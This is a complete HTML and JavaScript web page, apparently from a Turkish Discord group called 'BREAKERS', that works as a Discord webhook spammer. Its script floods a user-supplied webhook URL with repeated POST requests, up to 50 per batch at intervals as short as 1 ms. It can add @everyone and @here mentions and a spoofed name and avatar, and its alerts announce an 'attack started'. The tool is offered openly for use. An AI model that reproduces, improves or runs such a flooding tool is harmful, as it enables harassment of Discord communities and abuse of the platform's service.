<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>BREAKERS | WEBHOOK SPAMMER</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --gold: #ffd966;
            --gold-dark: #e6b422;
            --neon-blue: #00d4ff;
            --neon-pink: #ff4d8a;
            --dark-bg: #0e0e1a;
            --card-bg: rgba(20, 20, 35, 0.85);
            --input-bg: rgba(10, 10, 20, 0.8);
            --border-light: rgba(255, 255, 255, 0.2);
            --text-light: #f0f0f0;
            --error: #ff4d4d;
            --success: #2ecc71;
        }

        body {
            height: 100vh;
            overflow: hidden;
            font-family: 'Segoe UI', 'Poppins', 'Inter', sans-serif;
            background: radial-gradient(circle at 30% 10%, #1a1a2e, #0a0a1a);
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        /* hareketli ışık efekti */
        .bg-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(45deg, rgba(0,212,255,0.02) 0px, rgba(0,212,255,0.02) 2px, transparent 2px, transparent 8px);
            pointer-events: none;
            z-index: 0;
        }

        .glow-spot {
            position: fixed;
            width: 80vmax;
            height: 80vmax;
            background: radial-gradient(circle, rgba(255,217,102,0.1) 0%, rgba(0,0,0,0) 70%);
            border-radius: 50%;
            animation: drift 25s infinite alternate;
            pointer-events: none;
            z-index: 0;
        }

        @keyframes drift {
            0% { transform: translate(-30%, -30%); }
            100% { transform: translate(30%, 20%); }
        }

        /* ana kart - glassmorph, net kontrast */
        .spammer {
            position: relative;
            z-index: 10;
            width: 560px;
            max-width: 92vw;
            background: var(--card-bg);
            backdrop-filter: blur(14px);
            border-radius: 32px;
            border: 1px solid rgba(255, 255, 255, 0.25);
            padding: 24px 28px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.05) inset;
            transition: all 0.2s;
        }

        h1 {
            font-size: 2.3rem;
            text-align: center;
            background: linear-gradient(135deg, var(--gold), var(--neon-blue));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: 5px;
            margin-bottom: 18px;
            text-shadow: 0 0 8px rgba(0,212,255,0.3);
            animation: flicker 3s infinite;
        }

        @keyframes flicker {
            0%,100% { opacity: 1; text-shadow: 0 0 5px rgba(0,212,255,0.3);}
            96% { opacity: 1; }
            97% { opacity: 0.8; text-shadow: 0 0 12px rgba(255,217,102,0.8);}
        }

        /* dropzone */
        .drop-area {
            background: rgba(0, 0, 0, 0.4);
            border: 1.5px solid var(--border-light);
            border-radius: 24px;
            padding: 10px 16px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            transition: 0.2s;
        }
        .drop-area:hover {
            border-color: var(--gold);
            background: rgba(0, 0, 0, 0.5);
        }
        #avatarPreview {
            width: 52px;
            height: 52px;
            border-radius: 50%;
            object-fit: cover;
            border: 2px solid var(--gold);
            display: none;
        }
        .drop-text { font-size: 0.75rem; color: #ccc; flex: 1; }
        .avatar-input { flex: 2; }
        .avatar-input input {
            margin: 0;
            padding: 8px 10px;
            font-size: 0.75rem;
            background: rgba(0,0,0,0.6);
            border-color: var(--border-light);
        }

        /* form elemanları */
        input, textarea {
            width: 100%;
            background: var(--input-bg);
            border: 1px solid var(--border-light);
            border-radius: 18px;
            padding: 12px 16px;
            color: var(--text-light);
            font-size: 0.85rem;
            transition: 0.2s;
            margin: 8px 0;
        }
        textarea { resize: vertical; min-height: 70px; }
        input:focus, textarea:focus {
            outline: none;
            border-color: var(--gold);
            box-shadow: 0 0 8px rgba(255,217,102,0.4);
            background: rgba(10,10,20,0.9);
        }

        .row {
            display: flex;
            gap: 20px;
            align-items: center;
            margin: 10px 0;
            flex-wrap: wrap;
        }
        .row label {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.85rem;
            color: #ddd;
            cursor: pointer;
            background: rgba(0,0,0,0.3);
            padding: 6px 12px;
            border-radius: 30px;
            backdrop-filter: blur(4px);
        }
        /* custom checkbox */
        .row label input {
            width: 18px;
            height: 18px;
            margin: 0;
            accent-color: var(--gold);
            transform: scale(1);
        }

        /* hız paneli */
        .speed-panel {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 28px;
            padding: 12px 16px;
            margin: 12px 0;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .speed-header {
            display: flex;
            justify-content: space-between;
            font-size: 0.8rem;
            margin-bottom: 12px;
            color: var(--gold);
        }
        .dual-slider {
            display: flex;
            gap: 20px;
            margin-bottom: 10px;
        }
        .dual-slider div { flex: 1; }
        .dual-slider label { font-size: 0.7rem; color: #bbb; display: block; margin-bottom: 5px; }
        input[type="range"] {
            width: 100%;
            margin: 0;
            padding: 0;
            background: rgba(30,30,50,0.8);
            height: 4px;
            border-radius: 5px;
            -webkit-appearance: none;
        }
        input[type="range"]:focus { outline: none; }
        input[type="range"]::-webkit-slider-thumb {
            -webkit-appearance: none;
            width: 16px;
            height: 16px;
            border-radius: 50%;
            background: var(--gold);
            cursor: pointer;
            box-shadow: 0 0 5px var(--gold);
        }
        .batch-control {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-top: 12px;
            justify-content: space-between;
        }
        .batch-control span { font-size: 0.75rem; color: #ccc; }
        #batchSize {
            width: 80px;
            text-align: center;
            background: rgba(0,0,0,0.6);
            border-radius: 30px;
            padding: 6px;
            font-size: 0.8rem;
            margin: 0;
        }

        /* butonlar */
        .btn-group {
            display: flex;
            gap: 15px;
            margin: 20px 0 12px;
        }
        button {
            flex: 1;
            padding: 12px;
            font-weight: bold;
            border-radius: 40px;
            border: none;
            cursor: pointer;
            font-size: 0.9rem;
            transition: 0.2s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        #startBtn {
            background: linear-gradient(90deg, var(--gold), var(--neon-blue));
            color: #0a0a1a;
            box-shadow: 0 0 10px rgba(0,212,255,0.3);
        }
        #startBtn:hover { transform: scale(0.97); filter: brightness(1.02); box-shadow: 0 0 18px var(--neon-blue);}
        #stopBtn {
            background: rgba(255,77,77,0.2);
            border: 1px solid var(--error);
            color: var(--error);
        }
        #stopBtn:hover { background: var(--error); color: white; }
        #testBtn {
            background: rgba(46,204,113,0.15);
            border: 1px solid var(--success);
            color: var(--success);
            font-size: 0.75rem;
            padding: 8px 16px;
            width: auto;
            display: inline-block;
        }
        #testBtn:hover { background: var(--success); color: black; }

        .stats {
            display: flex;
            justify-content: space-between;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 40px;
            padding: 10px 18px;
            font-size: 0.8rem;
            margin: 16px 0 8px;
            backdrop-filter: blur(4px);
        }
        .counter {
            font-family: monospace;
            font-size: 1.1rem;
            font-weight: bold;
            color: var(--neon-blue);
        }

        .footer {
            text-align: center;
            font-size: 0.7rem;
            color: #aaa;
            border-top: 1px solid rgba(255,255,255,0.15);
            padding-top: 14px;
            margin-top: 12px;
        }
        .footer a { color: var(--gold); text-decoration: none; font-weight: 500; }

        .alert {
            position: fixed;
            top: 20px;
            right: -350px;
            background: #1e1e2e;
            backdrop-filter: blur(12px);
            padding: 8px 24px;
            border-radius: 40px;
            font-weight: bold;
            transition: 0.3s cubic-bezier(0.68, -0.55, 0.265, 1.55);
            z-index: 1000;
            font-size: 0.85rem;
            border-left: 4px solid var(--gold);
            color: white;
        }
    </style>
</head>
<body>
<div class="bg-animation"></div>
<div class="glow-spot" style="top: -20%; left: -20%;"></div>
<div class="glow-spot" style="bottom: -30%; right: -20%; animation-duration: 35s; animation-direction: alternate-reverse;"></div>

<div class="spammer">
    <h1>BREAKERS</h1>

    <!-- fotoğraf alanı -->
    <div class="drop-area" id="dropZone">
        <img id="avatarPreview" alt="avatar">
        <div class="drop-text">📸 SÜRÜKLE / BIRAK VEYA LİNK</div>
        <div class="avatar-input">
            <input type="text" id="avatarUrl" placeholder="Profil fotoğrafı URL">
        </div>
    </div>

    <input type="text" id="webhookUrl" placeholder="Webhook URL (discord.com/api/webhooks/...)" spellcheck="false">
    <input type="text" id="username" placeholder="Webhook ismi (isteğe bağlı)">
    <textarea id="message" rows="2" placeholder="Mesajınız..."></textarea>

    <div class="row">
        <label><input type="checkbox" id="everyoneMention"> @everyone ekle</label>
        <label><input type="checkbox" id="hereMention"> @here ekle</label>
    </div>

    <div class="speed-panel">
        <div class="speed-header">
            <span>⚡ SPAM GÜCÜ</span>
            <span id="effectiveRate" style="font-weight: bold;">20 msg/sn</span>
        </div>
        <div class="dual-slider">
            <div>
                <label>⏱️ Aralık (ms)</label>
                <input type="range" id="intervalSlider" min="1" max="100" value="50" step="1">
            </div>
            <div>
                <label>📦 Toplu mesaj</label>
                <input type="range" id="batchSlider" min="1" max="50" value="1" step="1">
            </div>
        </div>
        <div class="batch-control">
            <span>🔁 Her aralıkta gönderilecek mesaj sayısı:</span>
            <input type="number" id="batchSize" min="1" max="50" value="1" step="1">
        </div>
        <div style="font-size:0.65rem; text-align:center; margin-top: 8px; opacity:0.8;">🔥 Maks teorik: (1000/ms) × toplu sayı</div>
    </div>

    <div class="btn-group">
        <button id="startBtn">BAŞLAT</button>
        <button id="stopBtn">DURDUR</button>
    </div>
    <div style="text-align: center; margin: 6px 0;">
        <button id="testBtn">🔍 TEST WEBHOOK</button>
    </div>

    <div class="stats">
        <span>📬 Gönderilen: <span id="msgCount" class="counter">0</span></span>
        <span>⚡ Anlık hız: <span id="liveRate">0</span> msg/sn</span>
    </div>

    <div class="footer">
        dkrsnlx | <a href="https://discord.gg/thebreakers" target="_blank">discord.gg/thebreakers</a>
    </div>
</div>

<div id="alert" class="alert"></div>

<script>
    // DOM
    const webhookInput = document.getElementById('webhookUrl');
    const usernameInput = document.getElementById('username');
    const messageInput = document.getElementById('message');
    const avatarUrlInput = document.getElementById('avatarUrl');
    const everyoneCheck = document.getElementById('everyoneMention');
    const hereCheck = document.getElementById('hereMention');
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const testBtn = document.getElementById('testBtn');
    const msgCountSpan = document.getElementById('msgCount');
    const liveRateSpan = document.getElementById('liveRate');
    const effectiveRateSpan = document.getElementById('effectiveRate');
    const intervalSlider = document.getElementById('intervalSlider');
    const batchSlider = document.getElementById('batchSlider');
    const batchSizeInput = document.getElementById('batchSize');
    const dropZone = document.getElementById('dropZone');
    const avatarPreview = document.getElementById('avatarPreview');

    let isSpamming = false;
    let spamIntervalId = null;
    let sentTotal = 0;
    let startTime = 0;
    let rateUpdateInterval = null;
    let currentIntervalMs = 50;
    let currentBatch = 1;
    let droppedImageData = "";

    function showAlert(msg, isError = true) {
        const alertDiv = document.getElementById('alert');
        alertDiv.innerText = msg;
        alertDiv.style.backgroundColor = isError ? '#e74c3c' : '#2ecc71';
        alertDiv.style.right = '20px';
        setTimeout(() => { alertDiv.style.right = '-350px'; }, 3200);
    }

    function isValidWebhook(url) {
        if (!url) return false;
        try {
            const u = new URL(url);
            if (u.protocol !== 'https:') return false;
            const host = u.hostname;
            const valid = ['discord.com', 'canary.discord.com', 'ptb.discord.com', 'discordapp.com'];
            if (!valid.some(h => host === h || host.endsWith('.' + h))) return false;
            const path = u.pathname;
            if (!path.startsWith('/api/webhooks/')) return false;
            const parts = path.split('/').filter(p => p);
            return parts.length >= 3;
        } catch(e) { return false; }
    }

    function buildMessage() {
        let msg = messageInput.value;
        if (!msg) return null;
        if (everyoneCheck.checked) msg = "@everyone " + msg;
        if (hereCheck.checked) msg = "@here " + msg;
        return msg;
    }

    async function sendSingleWebhook() {
        const url = webhookInput.value.trim();
        if (!url) return false;
        const username = usernameInput.value.trim();
        const avatar = droppedImageData || avatarUrlInput.value.trim() || "";
        const content = buildMessage();
        if (!content) return false;
        try {
            const res = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: content,
                    username: username || "BREAKERS",
                    avatar_url: avatar
                })
            });
            if (res.ok) {
                sentTotal++;
                msgCountSpan.innerText = sentTotal;
                return true;
            }
        } catch(e) {}
        return false;
    }

    async function sendBatch() {
        if (!isSpamming) return;
        const promises = [];
        for (let i = 0; i < currentBatch; i++) {
            promises.push(sendSingleWebhook());
        }
        await Promise.allSettled(promises);
    }

    function startSpam() {
        const url = webhookInput.value.trim();
        const msg = buildMessage();
        if (!url) { showAlert("Webhook URL boş!"); return; }
        if (!isValidWebhook(url)) { showAlert("Geçersiz webhook URL'si!"); return; }
        if (!msg) { showAlert("Mesaj yazmalısın!"); return; }
        if (isSpamming) { showAlert("Zaten spam aktif!"); return; }

        sentTotal = 0;
        msgCountSpan.innerText = "0";
        startTime = Date.now();
        isSpamming = true;

        currentIntervalMs = parseInt(intervalSlider.value);
        currentBatch = parseInt(batchSlider.value);
        batchSizeInput.value = currentBatch;
        const rate = Math.round((1000 / currentIntervalMs) * currentBatch);
        effectiveRateSpan.innerText = rate + " msg/sn";

        if (spamIntervalId) clearInterval(spamIntervalId);
        spamIntervalId = setInterval(() => {
            if (isSpamming) sendBatch();
        }, currentIntervalMs);

        if (rateUpdateInterval) clearInterval(rateUpdateInterval);
        rateUpdateInterval = setInterval(() => {
            if (!isSpamming || startTime === 0) return;
            const elapsed = (Date.now() - startTime) / 1000;
            if (elapsed > 0) {
                const live = Math.round(sentTotal / elapsed);
                liveRateSpan.innerText = live;
            }
        }, 800);

        showAlert(`🔥 SALDIRI BAŞLADI! Hedef: ${rate} msg/sn`, false);
    }

    function stopSpam() {
        if (!isSpamming && !spamIntervalId) { showAlert("Aktif spam yok!"); return; }
        if (spamIntervalId) { clearInterval(spamIntervalId); spamIntervalId = null; }
        if (rateUpdateInterval) { clearInterval(rateUpdateInterval); rateUpdateInterval = null; }
        isSpamming = false;
        showAlert(`⛔ DURDURULDU. Toplam: ${sentTotal} mesaj`, true);
    }

    async function testWebhook() {
        const url = webhookInput.value.trim();
        if (!url) { showAlert("Webhook URL gir!"); return; }
        if (!isValidWebhook(url)) { showAlert("Geçersiz webhook!"); return; }
        const msg = buildMessage();
        if (!msg) { showAlert("Test için mesaj boş olamaz!"); return; }
        const username = usernameInput.value.trim() || "BREAKERS";
        const avatar = droppedImageData || avatarUrlInput.value.trim() || "";
        try {
            const res = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: "✅ **TEST MESAJI** — Webhook çalışıyor!",
                    username: username,
                    avatar_url: avatar
                })
            });
            if (res.ok) showAlert("Webhook çalışıyor! Test mesajı gönderildi.", false);
            else showAlert("Hata: " + res.status, true);
        } catch(e) { showAlert("Bağlantı hatası: " + e.message, true); }
    }

    function updateSpeed() {
        currentIntervalMs = parseInt(intervalSlider.value);
        currentBatch = parseInt(batchSlider.value);
        batchSizeInput.value = currentBatch;
        const rate = Math.round((1000 / currentIntervalMs) * currentBatch);
        effectiveRateSpan.innerText = rate + " msg/sn";
        if (isSpamming && spamIntervalId) {
            clearInterval(spamIntervalId);
            spamIntervalId = setInterval(() => { if (isSpamming) sendBatch(); }, currentIntervalMs);
            showAlert(`⚡ Hız güncellendi: ${rate} msg/sn`, false);
        }
    }

    intervalSlider.addEventListener('input', updateSpeed);
    batchSlider.addEventListener('input', updateSpeed);
    batchSizeInput.addEventListener('input', (e) => {
        let val = parseInt(e.target.value);
        if (isNaN(val)) val = 1;
        val = Math.min(50, Math.max(1, val));
        batchSlider.value = val;
        batchSizeInput.value = val;
        updateSpeed();
    });

    startBtn.onclick = startSpam;
    stopBtn.onclick = stopSpam;
    testBtn.onclick = testWebhook;

    // drag & drop avatar
    dropZone.addEventListener('dragover', (e) => { e.preventDefault(); dropZone.style.borderColor = "#ffd966"; dropZone.style.background = "rgba(0,0,0,0.6)"; });
    dropZone.addEventListener('dragleave', () => { dropZone.style.borderColor = "rgba(255,255,255,0.2)"; dropZone.style.background = "rgba(0,0,0,0.4)"; });
    dropZone.addEventListener('drop', (e) => {
        e.preventDefault();
        dropZone.style.borderColor = "rgba(255,255,255,0.2)";
        const file = e.dataTransfer.files[0];
        if (file && file.type.startsWith('image/')) {
            const reader = new FileReader();
            reader.onload = (ev) => {
                droppedImageData = ev.target.result;
                avatarPreview.src = droppedImageData;
                avatarPreview.style.display = 'block';
                showAlert("Profil fotoğrafı yüklendi", false);
            };
            reader.readAsDataURL(file);
        }
    });

    // ilk hız göstergesi
    updateSpeed();
</script>
</body>
</html>
